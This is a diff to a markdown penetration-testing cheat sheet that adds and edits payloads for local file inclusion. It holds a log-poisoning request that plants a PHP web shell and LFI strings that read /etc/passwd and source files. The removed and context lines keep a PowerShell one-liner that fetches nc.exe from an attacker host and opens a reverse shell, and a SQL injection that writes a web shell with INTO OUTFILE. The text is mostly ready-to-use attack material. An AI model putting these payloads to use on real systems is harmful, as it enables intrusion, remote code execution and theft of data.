@@ -153,16 +153,28 @@ gcc -m32|-m64 -o output source.c
 ```
 
 #### Local File Inclusion to Shell
-```php
-# Vulnerable web app on Windows + PHP through contaminated logs
-nc $WINDOWSTARGET 80
+```bash
+nc 192.168.1.102 80
+GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: 192.168.1.102
+Connection: close
 
-# Send as HTTP request
-<?php system($_GET['cmd']);?>
-
-# Send as cmd=
-powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
+# Then send as cmd payload via http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
 ```
+
+
+#### Local File Inclusion: Reading Files
+```
+file:///etc/passwd
+../../../etc/passwd
+php://filter/convert.base64-encode/resource=admin.php
+php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+php://input
+    send post data
+expect://whoami
+```
+
+
 #### Remote File InclusionShell: Windows + PHP
 ```php
 <?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.245/netcat/nc.exe','nc.exe'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\" }"); ?>
@@ -172,6 +184,7 @@ powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$
 ```sql
 # Assumed 3 columns
 http://target/index.php?vulnParam=0' UNION ALL SELECT 1,"<?php system($_REQUEST['cmd']);?>",2,3 INTO OUTFILE "c:/evil.php"-- uMj
+
 ```
 ```bash
 # sqlmap; post-request - captured request via Burp Proxy via Save Item to File.
